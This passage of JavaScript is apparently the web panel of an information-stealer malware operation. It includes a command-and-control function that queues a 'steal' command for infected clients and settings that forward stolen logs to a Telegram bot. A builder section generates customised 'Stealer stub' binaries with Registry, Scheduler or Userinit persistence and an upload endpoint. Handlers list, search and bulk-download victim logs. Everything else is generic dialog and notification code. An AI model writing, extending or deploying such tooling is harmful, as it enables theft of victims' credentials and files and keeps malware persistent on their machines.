    } catch (err) {
        console.error(err);
    }
}

function quickDeleteLog(id, btnEl) {
    const row = btnEl.closest('.client-row');
    const username = row ? row.querySelector('.client-info-user strong')?.innerText : '';
    showDialog({
        title: 'Delete Log',
        message: username ? `Remove log for ${username}?` : 'Remove this log?',
        type: 'danger',
        confirmText: 'Delete',
        onConfirm: async () => {
            await deleteLog(id);
            if (row) {
                row.style.opacity = '0';
                row.style.transform = 'translateX(40px)';
                row.style.transition = 'all 0.3s ease';
                setTimeout(() => {
                    row.remove();
                    updateBulkActions();
                }, 300);
            }
        }
    });
}

// C2 Command
async function sendStealCommand(clientId) {
    try {
        const res = await fetch('/api/c2/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ client_id: clientId, command: 'steal' })
        });
        if (res.ok) {
            showToast('Command sent', `Steal command queued for ${clientId}`);
        }
    } catch (e) {
        console.error('Failed to send command:', e);
    }
}

// 4. Settings Loader & Saver
async function loadSettings() {
    try {
        const response = await fetch('/api/settings');
        const settings = await response.json();

        document.getElementById('tg-enable-checkbox').checked = settings.tg_forward_enabled === 'true';
        document.getElementById('tg-token-input').value = settings.tg_bot_token || '';
        document.getElementById('tg-chat-input').value = settings.tg_chat_id || '';

        // Load panel preferences from localStorage
        const soundEnabled = localStorage.getItem('sound_alerts_enabled') !== 'false';
        const autoRefreshEnabled = localStorage.getItem('auto_refresh_enabled') !== 'false';
        document.getElementById('sound-alerts-checkbox').checked = soundEnabled;
        document.getElementById('auto-refresh-checkbox').checked = autoRefreshEnabled;

        // Load custom background and blur value
        const customBg = settings.custom_bg_path || '';
        const blurValue = settings.bg_blur_value || '15';
        const activeTheme = settings.active_bg_theme || 'theme-default';

        // Apply blur
        document.getElementById('bg-blur-slider').value = blurValue;
        applyBlurValue(blurValue);

        if (customBg) {
            applyCustomBackground(customBg);
        }

        // Apply theme/background class
        document.body.className = activeTheme;

        // Activate theme button highlights
        document.querySelectorAll('.theme-selector').forEach(sel => {
            if (sel.getAttribute('data-theme') === activeTheme) {
                sel.classList.add('active');
            } else {
                sel.classList.remove('active');
            }
        });
    } catch (err) {
        console.error('Error loading settings:', err);
    }
}

document.getElementById('save-settings-btn').addEventListener('click', async () => {
    const status = document.getElementById('save-status');
    status.className = 'save-status';
    status.innerText = 'Saving...';

    try {
        const body = {
            tg_forward_enabled: document.getElementById('tg-enable-checkbox').checked,
            tg_bot_token: document.getElementById('tg-token-input').value.trim(),
            tg_chat_id: document.getElementById('tg-chat-input').value.trim()
        };

        const res = await fetch('/api/settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });

        if (res.ok) {
            status.className = 'save-status success';
            status.innerText = 'Settings saved successfully!';
        } else {
            throw new Error('Save failed');
        }
    } catch (err) {
        status.className = 'save-status error';
        status.innerText = 'Error: ' + err.message;
    }
});

// --- Builder Client compiler ---
// Persistence dropdown
(function() {
    const toggle = document.getElementById('persistence-toggle');
    const dropdown = document.getElementById('persistence-dropdown');
    const label = document.getElementById('persistence-label');
    const noneCheck = document.getElementById('persist-none');
    const methodChecks = dropdown.querySelectorAll('input[type="checkbox"]:not(#persist-none)');

    toggle.addEventListener('click', (e) => {
        e.stopPropagation();
        dropdown.classList.toggle('open');
    });

    document.addEventListener('click', () => dropdown.classList.remove('open'));
    dropdown.addEventListener('click', (e) => e.stopPropagation());

    noneCheck.addEventListener('change', () => {
        if (noneCheck.checked) {
            methodChecks.forEach(c => { c.checked = false; });
        }
        updateLabel();
    });

    methodChecks.forEach(c => {
        c.addEventListener('change', () => {
            if (c.checked) noneCheck.checked = false;
            updateLabel();
        });
    });

    function updateLabel() {
        if (noneCheck.checked) { label.textContent = 'None'; return; }
        const selected = Array.from(methodChecks).filter(c => c.checked).map(c => {
            if (c.value === 'registry') return 'Registry';
            if (c.value === 'scheduler') return 'Scheduler';
            if (c.value === 'userinit') return 'Userinit';
            return c.value;
        });
        label.textContent = selected.length === 3 ? 'All Methods' : selected.length === 0 ? 'None' : selected.join(', ');
        if (selected.length === 0) noneCheck.checked = true;
    }
})();

document.getElementById('btn-build-stub').addEventListener('click', async () => {
    const consoleBox = document.getElementById('build-console');
    consoleBox.innerHTML = '';

    const log = (text, type = 'info') => {
        const span = document.createElement('span');
        span.className = `log-${type}`;
        span.innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
        consoleBox.appendChild(span);
        consoleBox.scrollTop = consoleBox.scrollHeight;
    };

    const delivery = document.querySelector('input[name="build-delivery"]:checked').value;
    const botToken = document.getElementById('build-tg-token').value.trim();
    const chatId = document.getElementById('build-tg-chat').value.trim();
    const panelUrl = window.location.origin + '/api/upload';
    const secretKey = currentUser.api_key || '';

    const persistChecks = document.querySelectorAll('#persistence-dropdown input[type="checkbox"]:checked');
    const persistMethods = Array.from(persistChecks).map(c => c.value).filter(v => v !== 'none');
    const persistence = document.getElementById('persist-none').checked ? 'none' : persistMethods.join(',') || 'none';

    // Validation
    if (delivery === 'TELEGRAM') {
        if (!botToken || !chatId) {
            log('Error: Telegram Bot Token and Chat ID are required!', 'error');
            return;
        }
    }

    log('Initializing compilation payload...', 'info');
    log(`Delivery target selected: ${delivery}`, 'warning');
    log(`Persistence: ${persistence}`, 'info');
    log('Contacting Python builder engine API...', 'info');

    try {
        const res = await fetch('/api/build', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence })
        });

        const data = await res.json();
        
        if (!res.ok) {
            throw new Error(data.error || 'Build api failed');
        }

        log('Stub base binary template loaded...', 'info');
        log('Patching binary structure configurations...', 'warning');
        log('Recalculating PE header checks...', 'info');
        log('Custom client generated successfully!', 'success');
        log('Downloading customized Stealer stub file...', 'success');

        // Direct browser file download
        window.location.href = data.downloadUrl;

    } catch (err) {
        log(`Compilation Error: ${err.message}`, 'error');
    }
});

// --- Modal Helper Functions ---
function closeModal() {
    document.getElementById('details-modal').classList.remove('active');
}
document.getElementById('modal-close-btn').addEventListener('click', closeModal);
document.getElementById('file-viewer-close').addEventListener('click', closeFileViewer);
document.querySelector('.modal-backdrop').addEventListener('click', closeModal);

// Pagination
document.getElementById('prev-page-btn').addEventListener('click', () => {
    if (currentPage > 1) {
        currentPage--;
        loadClients();
    }
});
document.getElementById('next-page-btn').addEventListener('click', () => {
    currentPage++;
    loadClients();
});

// Search
document.getElementById('search-input').addEventListener('input', (e) => {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(() => {
        searchQuery = e.target.value.trim();
        currentPage = 1;
        loadClients();
    }, 450);
});

document.getElementById('refresh-logs-btn').addEventListener('click', () => {
    loadClients();
});

// Bulk Actions
document.getElementById('bulk-download-btn').addEventListener('click', () => {
    const ids = getSelectedLogIds();
    if (ids.length === 0) return;
    ids.forEach(id => {
        const a = document.createElement('a');
        a.href = `/api/logs/${id}/download`;
        a.download = '';
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        setTimeout(() => a.remove(), 100);
    });
});

document.getElementById('bulk-delete-btn').addEventListener('click', () => {
    const ids = getSelectedLogIds();
    if (ids.length === 0) return;
    showDialog({
        title: 'Bulk Delete',
        message: `Delete ${ids.length} selected log(s)? This cannot be undone.`,
        type: 'danger',
        confirmText: `Delete ${ids.length}`,
        onConfirm: async () => {
            for (const id of ids) {
                await deleteLog(id);
            }
            loadClients();
            showToast('Bulk delete complete', `${ids.length} log(s) removed`);
        }
    });
});

// Sound & Auto-refresh settings listeners
document.getElementById('sound-alerts-checkbox').addEventListener('change', (e) => {
    localStorage.setItem('sound_alerts_enabled', e.target.checked);
});

document.getElementById('auto-refresh-checkbox').addEventListener('change', (e) => {
    localStorage.setItem('auto_refresh_enabled', e.target.checked);
    startAutoRefresh();
});

// Custom Dialog System
function showDialog({ title, message, type, confirmText, cancelText, onConfirm }) {
    const overlay = document.getElementById('dialog-overlay');
    const iconEl = document.getElementById('dialog-icon');
    const titleEl = document.getElementById('dialog-title');
    const msgEl = document.getElementById('dialog-message');
    const actionsEl = document.getElementById('dialog-actions');

    const icons = {
        danger: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>`,
        warning: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>`,
        error: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>`
    };

    const iconType = type || 'warning';
    iconEl.className = `dialog-icon icon-${iconType}`;
    iconEl.innerHTML = icons[iconType] || icons.warning;
    titleEl.innerText = title;
    msgEl.innerText = message;

    if (onConfirm) {
        actionsEl.innerHTML = `
            <button class="btn btn-outline" id="dialog-cancel">${cancelText || 'Cancel'}</button>
            <button class="btn btn-primary" id="dialog-confirm" style="${iconType === 'danger' ? 'background: var(--accent-red); border-color: var(--accent-red);' : ''}">${confirmText || 'Confirm'}</button>
        `;
        document.getElementById('dialog-cancel').onclick = () => closeDialog();
        document.getElementById('dialog-confirm').onclick = () => { closeDialog(); onConfirm(); };
    } else {
        actionsEl.innerHTML = `<button class="btn btn-primary" id="dialog-ok">OK</button>`;
        document.getElementById('dialog-ok').onclick = () => closeDialog();
    }

    overlay.classList.add('active');

    overlay.onclick = (e) => {
        if (e.target === overlay) closeDialog();
    };
}

function closeDialog() {
    document.getElementById('dialog-overlay').classList.remove('active');
}

function showAlert(title, message) {
    showDialog({ title, message, type: 'error' });
}

// Toast Notification System
function showToast(title, description, duration = 5000) {
    const container = document.getElementById('toast-container');

    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `
        <div class="toast-icon-box">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
                <polyline points="14 2 14 8 20 8"/>
                <line x1="16" y1="13" x2="8" y2="13"/>
                <line x1="16" y1="17" x2="8" y2="17"/>
                <polyline points="10 9 9 9 8 9"/>
            </svg>
        </div>
        <div class="toast-body">
            <span class="toast-title">${escapeHtml(title)}</span>
            <span class="toast-desc">${escapeHtml(description)}</span>
            <span class="toast-time">just now</span>
        </div>
        <div class="toast-progress">
            <div class="toast-progress-bar" style="animation-duration: ${duration}ms;"></div>
        </div>
    `;

    toast.addEventListener('click', () => dismissToast(toast));
    container.appendChild(toast);

    setTimeout(() => dismissToast(toast), duration);
}

function dismissToast(toast) {
    if (toast.classList.contains('toast-exit')) return;
    toast.classList.add('toast-exit');
    setTimeout(() => toast.remove(), 350);
}

// Helpers
function escapeHtml(text) {
    if (!text) return '';
    return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}

function formatDate(isoString) {
    if (!isoString) return 'N/A';
    try {
        const d = new Date(isoString);
        if (isNaN(d.getTime())) return isoString;
        return d.toLocaleString();
    } catch {
        return isoString;
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
